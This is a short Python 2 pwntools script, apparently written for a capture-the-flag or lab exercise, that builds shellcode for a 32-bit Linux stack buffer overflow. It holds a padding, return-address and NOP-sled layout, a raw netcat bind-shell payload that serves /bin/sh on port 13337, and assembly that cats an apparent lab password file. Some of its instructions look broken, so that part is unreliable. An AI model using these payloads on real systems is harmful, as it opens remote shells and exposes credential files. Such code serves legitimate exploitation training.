#  https://docs.pwntools.com/en/stable/
from pwn import *
context(arch = 'i386', os = 'linux')
import binascii

# "A" * 156 + \x70\xf6\xff\xbf + NOP * 112 + SH

netcat_sh = "\x31\xc0\x50\x68\x33\x33\x33\x37\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x50\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"

# print len(netcat_sh)
#
# sh1 = "6873737764682f2f7061682f657463"
#
#

# path = "push 0x737361702e",
#     "push 0x2f413362",
#     "push 0x616c2f65",
#     "push 0x6d6f682f","

# #print asm('push 0x737361702e', arch = 'i386', os = 'linux')
# print asm("push 0x73")

# sh1 = "52737377642f2f70612f657463"
# print binascii.unhexlify(sh1)[::-1]

inst = [
    "xor eax, eax",
    "mov eax, edx",
    "push edx",
    "push 0x7461632f",
    "push 0x6e69622",
    "mov ebx, esp",
    "push edx",
    "push 0x73",
    "push 0x7361702e",
    "push 0x2f413362",
    "push 0x616c2f65",
    "push 0x6d6f682f",
    "mov ecx, esp",
    "mov 0xB, al",
    "push edx",
    "push ecx",
    "push ebx",
    "mov ecx, esp",
    "int 80h"
]

sh = ''

for instr in inst:
    print instr
    sh += asm(instr)

print binascii.hexlify(sh)
